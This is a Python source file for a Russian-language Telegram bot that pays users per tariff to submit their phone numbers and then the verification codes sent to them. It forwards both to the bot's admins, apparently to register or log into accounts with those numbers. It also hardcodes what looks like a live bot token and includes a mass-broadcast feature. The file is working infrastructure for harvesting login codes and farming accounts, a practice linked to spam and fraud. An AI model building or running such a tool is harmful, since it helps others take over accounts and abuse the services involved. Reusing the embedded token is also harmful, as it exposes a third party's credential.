import asyncio
import logging
import aiosqlite
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery)

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8220500651:AAHKBf-AZ3UT7kH1oOrEEl-NwDWSE4DYoWw"
# Добавь ID всех админов в этот список через запятую
ADMIN_IDS = [7323981601] 
CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"
CHANNEL_ID = -1003532318157

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Глобальный статус работы
WORK_STATUS = True 

# --- СОСТОЯНИЯ ---
class Form(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()
    broadcasting = State()

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
        await db.execute('''CREATE TABLE IF NOT EXISTS requests 
                           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                            phone TEXT, tariff TEXT, code TEXT, status INTEGER DEFAULT 0)''')
        await db.commit()

# --- КЛАВИАТУРЫ ---
def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📱 Сдать номер"), KeyboardButton(text="📩 Отправить код")],
        [KeyboardButton(text="📢 Канал/Чат")]
    ], resize_keyboard=True)

def tariff_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="⚡️ 1.5$ Рег Момент")],
        [KeyboardButton(text="🌙 2.5$ Вбх вечер")],
        [KeyboardButton(text="🔙 Назад")]
    ], resize_keyboard=True)

def admin_kb():
    status_emoji = "🟢" if WORK_STATUS else "🔴"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📂 Новые заявки", callback_data="admin_view_new")],
        [InlineKeyboardButton(text=f"✅ Start Work", callback_data="work_start"),
         InlineKeyboardButton(text=f"❌ Stop Work", callback_data="work_stop")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")]
    ])

# --- ПРОВЕРКА ПОДПИСКИ ---
async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_ID, user_id)
        return m.status in ['member', 'administrator', 'creator']
    except: 
        return False

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT OR IGNORE INTO users VALUES (?)', (message.from_user.id,))
        await db.commit()
    
    if not await check_sub(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔗 Вступить в канал", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="🔄 Я подписался", callback_data="check_sub_now")]
        ])
        return await message.answer("⚠️ **Доступ ограничен!**\nДля работы подпишитесь на канал.", reply_markup=kb, parse_mode="Markdown")

    await message.answer(f"👋 Привет, {message.from_user.first_name}!\nВыбирай пункт меню:", reply_markup=main_kb())

@dp.callback_query(F.data == "check_sub_now")
async def check_sub_callback(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        await callback.message.delete()
        await callback.message.answer("✅ Подписка подтверждена!", reply_markup=main_kb())
    else:
        await callback.answer("❌ Вы еще не подписаны на канал!", show_alert=True)

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id in ADMIN_IDS:
        status_text = "🟢 РАБОТАЕМ" if WORK_STATUS else "🔴 ОТДЫХАЕМ"
        await message.answer(f"🛠 **Админ-панель**\nСтатус: {status_text}", reply_markup=admin_kb(), parse_mode="Markdown")

# --- ЛОГИКА СТАРТ/СТОП ВОРК ---
@dp.callback_query(F.data.startswith("work_"))
async def toggle_work(callback: CallbackQuery):
    global WORK_STATUS
    if callback.from_user.id not in ADMIN_IDS: return
    
    action = callback.data.split("_")[1]
    WORK_STATUS = (action == "start")
    
    msg = "🚀 **Работаем!** Можно сдавать номера." if WORK_STATUS else "😴 **Отдыхаем!** Прием номеров временно закрыт."
    
    await callback.message.edit_text(f"Выполнено: {msg}\nДелаю рассылку...", parse_mode="Markdown")
    
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT user_id FROM users') as cursor:
            users = await cursor.fetchall()

    for user in users:
        try:
            await bot.send_message(user[0], msg, parse_mode="Markdown")
            await asyncio.sleep(0.05)
        except: pass
    await callback.answer("Готово!")

# Сдача номера
@dp.message(F.text == "📱 Сдать номер")
async def rent_start(message: types.Message, state: FSMContext):
    if not WORK_STATUS:
        return await message.answer("😴 **Сейчас мы отдыхаем.** Мы пришлем уведомление, когда начнем!", parse_mode="Markdown")
    
    if not await check_sub(message.from_user.id):
        return await start(message)
    
    await state.set_state(Form.choosing_tariff)
    await message.answer("💵 **Выберите тариф:**", reply_markup=tariff_kb(), parse_mode="Markdown")

@dp.message(Form.choosing_tariff)
async def rent_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Меню:", reply_markup=main_kb())
    await state.update_data(tariff=message.text)
    await state.set_state(Form.entering_number)
    await message.answer("📲 **Введите номер (цифры):**", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Назад")]], resize_keyboard=True))

@dp.message(Form.entering_number)
async def rent_number(message: types.Message, state: FSMContext):
    phone = re.sub(r'\D', '', message.text)
    if len(phone) < 7: return await message.answer("❌ Ошибка в номере.")

    data = await state.get_data()
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', (message.from_user.id, phone, data['tariff']))
        await db.commit()
    
    chat_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Написать", url=f"tg://user?id={message.from_user.id}")]])
    for admin_id in ADMIN_IDS:
        try: await bot.send_message(admin_id, f"🆕 **Новая заявка!**\n📱: `{phone}`\n💰: {data['tariff']}", parse_mode="Markdown", reply_markup=chat_kb)
        except: pass
    
    await state.clear()
    await message.answer("✅ **Заявка принята!** Ждите запроса кода.", reply_markup=main_kb())

# Отправка кода
@dp.message(F.text == "📩 Отправить код")
async def code_start(message: types.Message, state: FSMContext):
    await state.set_state(Form.entering_code)
    await message.answer("🔑 **Введите код:**", parse_mode="Markdown")

@dp.message(Form.entering_code)
async def code_finish(message: types.Message, state: FSMContext):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (message.text, message.from_user.id))
        await db.commit()
    
    chat_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Написать", url=f"tg://user?id={message.from_user.id}")]])
    for admin_id in ADMIN_IDS:
        try: await bot.send_message(admin_id, f"🔑 **КОД!**\n💬: `{message.text}`", parse_mode="Markdown", reply_markup=chat_kb)
        except: pass
    
    await state.clear()
    await message.answer("✅ Код передан.", reply_markup=main_kb())

@dp.message(F.text == "📢 Канал/Чат")
async def channel_info(message: types.Message):
    await message.answer("Наш канал:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=CHANNEL_LINK)]]))

# Админка: Очередь
@dp.callback_query(F.data == "admin_view_new")
async def view_requests(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT id, phone, tariff, user_id, code FROM requests WHERE status = 0 LIMIT 1') as cursor:
            row = await cursor.fetchone()
    if not row: return await callback.answer("Пусто!")
    
    text = f"📋 **#{row[0]}**\n📱: `{row[1]}`\n💰: {row[2]}\n🔑: `{row[4] or 'ожидание'}`"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={row[3]}")],
        [InlineKeyboardButton(text="✅ Готово", callback_data=f"done_{row[0]}")],
        [InlineKeyboardButton(text="❌ Закрыть", callback_data="admin_close")]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")

@dp.callback_query(F.data.startswith("done_"))
async def mark_done(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    req_id = callback.data.split("_")[1]
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET status = 1 WHERE id = ?', (req_id,))
        await db.commit()
    await view_requests(callback)

@dp.callback_query(F.data == "admin_close")
async def admin_close(callback: CallbackQuery):
    await callback.message.delete()

# Рассылка
@dp.callback_query(F.data == "admin_broadcast")
async def b_start(c: CallbackQuery, state: FSMContext):
    if c.from_user.id not in ADMIN_IDS: return
    await state.set_state(Form.broadcasting)
    await c.message.answer("Текст рассылки:")

@dp.message(Form.broadcasting)
async def b_do(m: types.Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS: return
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT user_id FROM users') as cursor:
            users = await cursor.fetchall()
    for u in users:
        try: await m.copy_to(u[0]); await asyncio.sleep(0.05)
        except: pass
    await state.clear(); await m.answer("Готово!")

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
